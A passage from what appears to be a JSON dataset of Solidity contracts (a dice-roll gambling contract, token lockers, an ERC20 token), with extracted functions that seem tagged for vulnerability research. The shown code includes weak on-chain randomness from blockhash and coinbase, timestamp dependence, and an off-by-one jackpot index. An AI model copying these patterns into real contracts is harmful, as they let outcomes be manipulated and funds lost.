(b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal pure returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal pure returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal pure returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal pure returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal pure returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal pure returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n using CBOR for Buffer.buffer;\n function stra2cbor(string[] arr) internal pure returns (bytes) {\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeString(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n function ba2cbor(bytes[] arr) internal pure returns (bytes) {\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeBytes(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal view returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n require((_nbytes > 0) && (_nbytes <= 32));\n _delay *= 10;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes memory delay = new bytes(32);\n assembly {\n mstore(add(delay, 0x20), _delay)\n }\n bytes memory delay_bytes8 = new bytes(8);\n copyBytes(delay, 24, 8, delay_bytes8, 0);\n bytes[4] memory args = [unonce, nbytes, sessionKeyHash, delay];\n bytes32 queryId = oraclize_query(\"random\", args, _customGasLimit);\n bytes memory delay_bytes8_left = new bytes(8);\n assembly {\n let x := mload(add(delay_bytes8, 0x20))\n mstore8(add(delay_bytes8_left, 0x27), div(x, 0x100000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x26), div(x, 0x1000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x25), div(x, 0x10000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x24), div(x, 0x100000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x23), div(x, 0x1000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x22), div(x, 0x10000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x21), div(x, 0x100000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x20), div(x, 0x1000000000000000000000000000000000000000000000000))\n }\n oraclize_randomDS_setCommitment(queryId, keccak256(delay_bytes8_left, args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(keccak256(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(keccak256(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = byte(1);\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n require((_proof[0] == \"L\") && (_proof[1] == \"P\") && (_proof[2] == 1));\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n require(proofVerified);\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix, uint n_random_bytes) internal pure returns (bool){\n bool match_ = true;\n require(prefix.length == n_random_bytes);\n for (uint256 i=0; i< n_random_bytes; i++) {\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n if (!(keccak256(keyhash) == keccak256(sha256(context_name, queryId)))) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n if (!matchBytes32Prefix(sha256(sig1), result, uint(proof[ledgerProofLength+32+8]))) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == keccak256(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n if (!verifySig(sha256(tosign1), sig1, sessionPubkey)) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal pure returns (bytes) {\n uint minLength = length + toOffset;\n require(to.length >= minLength);\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\ncontract SafeMath {\n function safeToAdd(uint a, uint b) pure internal returns (bool) {\n return (a + b >= a);\n }\n function safeAdd(uint a, uint b) pure internal returns (uint) {\n require(safeToAdd(a, b));\n return a + b;\n }\n function safeToSubtract(uint a, uint b) pure internal returns (bool) {\n return (b <= a);\n }\n function safeSub(uint a, uint b) pure internal returns (uint) {\n require(safeToSubtract(a, b));\n return a - b;\n }\n}\ncontract DiceRoll is SafeMath,usingOraclize {\n address public owner;\n uint8 constant public maxNumber = 99;\n uint8 constant public minNumber = 1;\n bool public gamePaused = false;\n bool public jackpotPaused = false;\n bool public refundPaused = false;\n uint256 public contractBalance;\n uint16 public houseEdge;\n uint256 public maxProfit;\n uint16 public maxProfitAsPercentOfHouse;\n uint256 public minBet;\n uint256 public maxBet;\n uint16 public jackpotOfHouseEdge;\n uint256 public minJackpotBet;\n uint256 public jackpotBlance;\n address[] public jackpotPlayer;\n uint256 public JackpotPeriods = 1;\n uint64 public nextJackpotTime;\n uint16 public jackpotPersent = 100;\n uint256 public totalWeiWon;\n uint256 public totalWeiWagered;\n mapping (bytes32 => address) playerAddress;\n mapping (bytes32 => uint256) playerBetAmount;\n mapping (bytes32 => uint8) playerNumberStart;\n mapping (bytes32 => uint8) playerNumberEnd;\n uint256 public oraclizeGasLimit;\n uint public oraclizeFee;\n uint seed;\n modifier betIsValid(uint256 _betSize, uint8 _start, uint8 _end) {\n require(_betSize >= minBet && _betSize <= maxBet && _start >= minNumber && _end <= maxNumber && _start < _end);\n _;\n }\n modifier oddEvenBetIsValid(uint256 _betSize, uint8 _oddeven) {\n require(_betSize >= minBet && _betSize <= maxBet && (_oddeven == 1 || _oddeven == 0));\n _;\n }\n modifier gameIsActive {\n require(!gamePaused);\n _;\n }\n modifier jackpotAreActive {\n require(!jackpotPaused);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyOraclize {\n require(msg.sender == oraclize_cbAddress());\n _;\n }\n event LogResult(bytes32 indexed QueryId, address indexed Address, uint8 DiceResult, uint256 Value, uint8 Status, uint8 Start, uint8 End, uint8 OddEven, uint256 BetValue);\n event LogRefund(bytes32 indexed QueryId, uint256 Amount);\n event LogJackpot(bytes32 indexed QueryId, address indexed Address, uint256 jackpotValue);\n event LogOwnerTransfer(address SentToAddress, uint256 AmountTransferred);\n event SendJackpotSuccesss(address indexed winner, uint256 amount, uint256 JackpotPeriods);\n function() public payable{\n contractBalance = safeAdd(contractBalance, msg.value);\n setMaxProfit();\n }\n function DiceRoll() public {\n owner = msg.sender;\n houseEdge = 20;\n maxProfitAsPercentOfHouse = 100;\n minBet = 0.1 ether;\n maxBet = 1 ether;\n jackpotOfHouseEdge = 500;\n minJackpotBet = 0.1 ether;\n jackpotPersent = 100;\n oraclizeGasLimit = 300000;\n oraclizeFee = 1200000000000000;\n oraclize_setCustomGasPrice(4000000000);\n nextJackpotTime = uint64(block.timestamp);\n oraclize_setProof(proofType_Ledger);\n }\n function playerRoll(uint8 start, uint8 end) public payable gameIsActive betIsValid(msg.value, start, end) {\n totalWeiWagered += msg.value;\n bytes32 queryId = oraclize_newRandomDSQuery(0, 30, oraclizeGasLimit);\n playerAddress[queryId] = msg.sender;\n playerBetAmount[queryId] = msg.value;\n playerNumberStart[queryId] = start;\n playerNumberEnd[queryId] = end;\n contractBalance = safeSub(contractBalance,oraclizeFee);\n }\n function oddEven(uint8 oddeven) public payable gameIsActive oddEvenBetIsValid(msg.value, oddeven) {\n totalWeiWagered += msg.value;\n bytes32 queryId = oraclize_newRandomDSQuery(0, 30, oraclizeGasLimit);\n playerAddress[queryId] = msg.sender;\n playerBetAmount[queryId] = msg.value;\n playerNumberStart[queryId] = oddeven;\n playerNumberEnd[queryId] = 0;\n contractBalance = safeSub(contractBalance,oraclizeFee);\n }\n function __callback(bytes32 queryId, string result, bytes proof) public onlyOraclize {\n if (oraclize_randomDS_proofVerify__returnCode(queryId, result, proof) != 0) {\n if(!refundPaused){\n playerAddress[queryId].transfer(playerBetAmount[queryId]);\n LogRefund(queryId, playerBetAmount[queryId]);\n }else{\n contractBalance = safeAdd(contractBalance,playerBetAmount[queryId]);\n }\n }else{\n uint8 tempStart = playerNumberStart[queryId];\n uint8 tempEnd = playerNumberEnd[queryId];\n address tempAddress = playerAddress[queryId];\n uint256 tempAmount = playerBetAmount[queryId];\n uint8 probability;\n uint256 houseEdgeFee;\n uint256 playerProfit;\n uint8 random = uint8(uint256(keccak256(result)) % 100) + 1;\n delete playerAddress[queryId];\n delete playerBetAmount[queryId];\n delete playerNumberStart[queryId];\n delete playerNumberEnd[queryId];\n if(tempEnd == 0){\n if(random % 2 == tempStart){\n probability = 50;\n playerProfit = getProfit(probability,tempAmount);\n totalWeiWon = safeAdd(totalWeiWon, playerProfit);\n contractBalance = safeSub(contractBalance, playerProfit);\n setMaxProfit();\n LogResult(queryId, tempAddress, random, playerProfit, 1, 0, 0, tempStart, tempAmount);\n houseEdgeFee = getHouseEdgeFee(probability, tempAmount);\n increaseJackpot(houseEdgeFee * jackpotOfHouseEdge / 1000, queryId, tempAddress, tempAmount);\n tempAddress.transfer(safeAdd(playerProfit, tempAmount));\n }else{\n LogResult(queryId, tempAddress, random, 0, 0, 0, 0, tempEnd, tempAmount);\n contractBalance = safeAdd(contractBalance, (tempAmount - 1));\n setMaxProfit();\n tempAddress.transfer(1);\n }\n }else if(tempEnd != 0 && tempStart != 0){\n if(tempStart <= random && random <= tempEnd){\n probability = tempEnd - tempStart + 1;\n playerProfit = getProfit(probability,tempAmount);\n totalWeiWon = safeAdd(totalWeiWon, playerProfit);\n contractBalance = safeSub(contractBalance, playerProfit);\n setMaxProfit();\n LogResult(queryId, tempAddress, random, playerProfit, 1, tempStart, tempEnd, 2, tempAmount);\n houseEdgeFee = getHouseEdgeFee(probability, tempAmount);\n increaseJackpot(houseEdgeFee * jackpotOfHouseEdge / 1000, queryId, tempAddress, tempAmount);\n tempAddress.transfer(safeAdd(playerProfit, tempAmount));\n }else{\n LogResult(queryId, tempAddress, random, 0, 0, tempStart, tempEnd, 2, tempAmount);\n contractBalance = safeAdd(contractBalance, (tempAmount - 1));\n setMaxProfit();\n tempAddress.transfer(1);\n }\n }\n }\n }\n function increaseJackpot(uint256 increaseAmount, bytes32 _queryId, address _address, uint256 _amount) internal {\n require(increaseAmount < maxProfit);\n LogJackpot(_queryId, _address, increaseAmount);\n contractBalance = safeSub(contractBalance, increaseAmount);\n jackpotBlance = safeAdd(jackpotBlance, increaseAmount);\n if(_amount >= minJackpotBet){\n jackpotPlayer.push(_address);\n }\n }\n function createWinner() public onlyOwner jackpotAreActive {\n uint64 tmNow = uint64(block.timestamp);\n require(tmNow >= nextJackpotTime);\n require(jackpotPlayer.length > 0);\n uint random = rand() % jackpotPlayer.length;\n address winner = jackpotPlayer[random - 1];\n sendJackpot(winner);\n }\n function sendJackpot(address winner) internal jackpotAreActive {\n uint256 amount = jackpotBlance * jackpotPersent / 1000;\n require(jackpotBlance > amount);\n jackpotBlance = safeSub(jackpotBlance, amount);\n jackpotPlayer.length = 0;\n nextJackpotTime = uint64(block.timestamp) + 72000;\n winner.transfer(amount);\n SendJackpotSuccesss(winner, amount, JackpotPeriods);\n JackpotPeriods += 1;\n }\n function sendValueToJackpot() payable public jackpotAreActive {\n jackpotBlance = safeAdd(jackpotBlance, msg.value);\n }\n function getHouseEdgeFee(uint8 _probability, uint256 _betValue) view internal returns (uint256){\n return (_betValue * (100 - _probability) / _probability + _betValue) * houseEdge / 1000;\n }\n function getProfit(uint8 _probability, uint256 _betValue) view internal returns (uint256){\n uint256 tempProfit = ((_betValue * (100 - _probability) / _probability + _betValue) * (1000 - houseEdge) / 1000) - _betValue;\n if(tempProfit > maxProfit) tempProfit = maxProfit;\n return tempProfit;\n }\n function rand() internal returns (uint256) {\n seed = uint256(keccak256(seed, block.blockhash(block.number - 1), block.coinbase, block.difficulty));\n return seed;\n }\n function setMaxProfit() internal {\n maxProfit = contractBalance * maxProfitAsPercentOfHouse / 1000;\n }\n function ownerSetOraclizeGas(uint newPrice, uint newGasLimit) public onlyOwner{\n require(newGasLimit > 50000 && newGasLimit <300000);\n require(newPrice > 1000000000 && newPrice <15000000000);\n oraclize_setCustomGasPrice(newPrice);\n oraclizeGasLimit = newGasLimit;\n oraclizeFee = newGasLimit * newPrice;\n }\n function ownerSetHouseEdge(uint16 newHouseEdge) public onlyOwner{\n require(newHouseEdge <= 1000);\n houseEdge = newHouseEdge;\n }\n function ownerSetMinJackpoBet(uint256 newVal) public onlyOwner{\n require(newVal <= 1 ether);\n minJackpotBet = newVal;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint8 newMaxProfitAsPercent) public onlyOwner{\n require(newMaxProfitAsPercent <= 1000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint256 newMinimumBet) public onlyOwner{\n minBet = newMinimumBet;\n }\n function ownerSetMaxBet(uint256 newMaxBet) public onlyOwner{\n maxBet = newMaxBet;\n }\n function ownerSetJackpotOfHouseEdge(uint16 newProportion) public onlyOwner{\n require(newProportion < 1000);\n jackpotOfHouseEdge = newProportion;\n }\n function ownerPauseGame(bool newStatus) public onlyOwner{\n gamePaused = newStatus;\n }\n function ownerPauseJackpot(bool newStatus) public onlyOwner{\n jackpotPaused = newStatus;\n }\n function ownerTransferEther(address sendTo, uint256 amount) public onlyOwner{\n contractBalance = safeSub(contractBalance, amount);\n sendTo.transfer(amount);\n setMaxProfit();\n LogOwnerTransfer(sendTo, amount);\n }\n function ownerChangeOwner(address newOwner) public onlyOwner{\n owner = newOwner;\n }\n function ownerkill() public onlyOwner{\n selfdestruct(owner);\n }\n}",
  "extract_feature": [
    "function DiceRoll() public {\nowner = msg.sender;\nhouseEdge = 20;\nmaxProfitAsPercentOfHouse = 100;\nminBet = 0.1 ether;\nmaxBet = 1 ether;\njackpotOfHouseEdge = 500;\nminJackpotBet = 0.1 ether;\njackpotPersent = 100;\noraclizeGasLimit = 300000;\noraclizeFee = 1200000000000000;\noraclize_setCustomGasPrice(4000000000);\nnextJackpotTime = uint64(block.timestamp);\noraclize_setProof(proofType_Ledger);\n}",
    "function createWinner() public onlyOwner jackpotAreActive {\nuint64 tmNow = uint64(block.timestamp);\nrequire(tmNow >= nextJackpotTime);\nrequire(jackpotPlayer.length > 0);\nuint random = rand() % jackpotPlayer.length;\naddress winner = jackpotPlayer[random - 1];\nsendJackpot(winner);\n}",
    "function sendJackpot(address winner) internal jackpotAreActive {\nuint256 amount = jackpotBlance * jackpotPersent / 1000;\nrequire(jackpotBlance > amount);\njackpotBlance = safeSub(jackpotBlance, amount);\njackpotPlayer.length = 0;\nnextJackpotTime = uint64(block.timestamp) + 72000;\nwinner.transfer(amount);\nSendJackpotSuccesss(winner, amount, JackpotPeriods);\nJackpotPeriods += 1;\n}",
    "function rand() internal returns (uint256) {\nseed = uint256(keccak256(seed, block.blockhash(block.number - 1), block.coinbase, block.difficulty));\nreturn seed;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f88"
  },
  "filename": "9499.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n function transfer(address to, uint256 value) returns (bool success);\n function transferFrom(address from, address to, uint256 value) returns (bool success);\n function approve(address spender, uint256 value) returns (bool success);\n function totalSupply() constant returns (uint256 totalSupply) {}\n function balanceOf(address owner) constant returns (uint256 balance);\n function allowance(address owner, address spender) constant returns (uint256 remaining);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract WaltonTokenLocker {\n address public beneficiary;\n uint256 public releaseTime;\n string constant public name = \"refund locker\";\n Token public token = Token('0xb7cB1C96dB6B22b0D3d9536E0108d062BD488F74');\n function WaltonTokenLocker() public {\n beneficiary = address('0x38A9e09E14397Fe3A5Fe59dfc1d98D8B8897D610');\n releaseTime = 1538236800;\n }\n function release() public {\n if (block.timestamp < releaseTime)\n throw;\n uint256 totalTokenBalance = token.balanceOf(this);\n if (totalTokenBalance > 0)\n if (!token.transfer(beneficiary, totalTokenBalance))\n throw;\n }\n function releaseToken(address _tokenContractAddress) public {\n if (block.timestamp < releaseTime)\n throw;\n Token _token = Token(_tokenContractAddress);\n uint256 totalTokenBalance = _token.balanceOf(this);\n if (totalTokenBalance > 0)\n if (!_token.transfer(beneficiary, totalTokenBalance))\n throw;\n }\n function releaseTimestamp() public constant returns (uint timestamp) {\n return releaseTime;\n }\n function currentTimestamp() public constant returns (uint timestamp) {\n return block.timestamp;\n }\n function secondsRemaining() public constant returns (uint timestamp) {\n if (block.timestamp < releaseTime)\n return releaseTime - block.timestamp;\n else\n return 0;\n }\n function tokenLocked() public constant returns (uint amount) {\n return token.balanceOf(this);\n }\n}",
  "extract_feature": [
    "function release() public {\nif (block.timestamp < releaseTime)\nthrow;\nuint256 totalTokenBalance = token.balanceOf(this);\nif (totalTokenBalance > 0)\nif (!token.transfer(beneficiary, totalTokenBalance))\nthrow;\n}",
    "function releaseToken(address _tokenContractAddress) public {\nif (block.timestamp < releaseTime)\nthrow;\nToken _token = Token(_tokenContractAddress);\nuint256 totalTokenBalance = _token.balanceOf(this);\nif (totalTokenBalance > 0)\nif (!_token.transfer(beneficiary, totalTokenBalance))\nthrow;\n}",
    "function currentTimestamp() public constant returns (uint timestamp) {\nreturn block.timestamp;\n}",
    "function secondsRemaining() public constant returns (uint timestamp) {\nif (block.timestamp < releaseTime)\nreturn releaseTime - block.timestamp;\nelse\nreturn 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f89"
  },
  "filename": "9500.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Token {\n function transfer(address to, uint256 value) returns (bool success);\n function transferFrom(address from, address to, uint256 value) returns (bool success);\n function approve(address spender, uint256 value) returns (bool success);\n function totalSupply() constant returns (uint256 totalSupply) {}\n function balanceOf(address owner) constant returns (uint256 balance);\n function allowance(address owner, address spender) constant returns (uint256 remaining);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract WaltonTokenLocker {\n address public beneficiary;\n uint256 public releaseTime;\n string constant public name = \"team locker\";\n Token public token = Token('0xb7cB1C96dB6B22b0D3d9536E0108d062BD488F74');\n function WaltonTokenLocker() public {\n beneficiary = address('0x732f589BA0b134DC35454716c4C87A06C890445b');\n releaseTime = 1563379200;\n }\n function release() public {\n if (block.timestamp < releaseTime)\n throw;\n uint256 totalTokenBalance = token.balanceOf(this);\n if (totalTokenBalance > 0)\n if (!token.transfer(beneficiary, totalTokenBalance))\n throw;\n }\n function releaseToken(address _tokenContractAddress) public {\n if (block.timestamp < releaseTime)\n throw;\n Token _token = Token(_tokenContractAddress);\n uint256 totalTokenBalance = _token.balanceOf(this);\n if (totalTokenBalance > 0)\n if (!_token.transfer(beneficiary, totalTokenBalance))\n throw;\n }\n function releaseTimestamp() public constant returns (uint timestamp) {\n return releaseTime;\n }\n function currentTimestamp() public constant returns (uint timestamp) {\n return block.timestamp;\n }\n function secondsRemaining() public constant returns (uint timestamp) {\n if (block.timestamp < releaseTime)\n return releaseTime - block.timestamp;\n else\n return 0;\n }\n function tokenLocked() public constant returns (uint amount) {\n return token.balanceOf(this);\n }\n}",
  "extract_feature": [
    "function release() public {\nif (block.timestamp < releaseTime)\nthrow;\nuint256 totalTokenBalance = token.balanceOf(this);\nif (totalTokenBalance > 0)\nif (!token.transfer(beneficiary, totalTokenBalance))\nthrow;\n}",
    "function releaseToken(address _tokenContractAddress) public {\nif (block.timestamp < releaseTime)\nthrow;\nToken _token = Token(_tokenContractAddress);\nuint256 totalTokenBalance = _token.balanceOf(this);\nif (totalTokenBalance > 0)\nif (!_token.transfer(beneficiary, totalTokenBalance))\nthrow;\n}",
    "function currentTimestamp() public constant returns (uint timestamp) {\nreturn block.timestamp;\n}",
    "function secondsRemaining() public constant returns (uint timestamp) {\nif (block.timestamp < releaseTime)\nreturn releaseTime - block.timestamp;\nelse\nreturn 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f8a"
  },
  "filename": "9502.sol",
  "content": "pragma solidity ^0.4.21;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to 